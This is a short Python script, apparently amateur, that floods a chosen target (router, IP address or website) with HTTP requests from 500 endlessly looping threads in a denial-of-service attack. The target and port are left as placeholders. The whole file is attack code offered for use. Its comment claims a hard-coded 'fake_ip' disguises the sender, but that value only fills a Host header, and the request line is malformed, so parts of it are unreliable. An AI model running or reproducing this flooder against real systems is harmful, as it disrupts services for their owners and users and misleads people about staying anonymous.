import threading
import socket

#todo target = "Router's IP Address/IP Address/Website"

#Port 22 = SSH Service (Website would still work)
#Port 80 = HDP (Web Interface Might go Down)
#todo port = #

fake_ip = "182.21.20.32" #Disguising my IP Address

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target = attack) #Target Command/Target Function
    thread.start()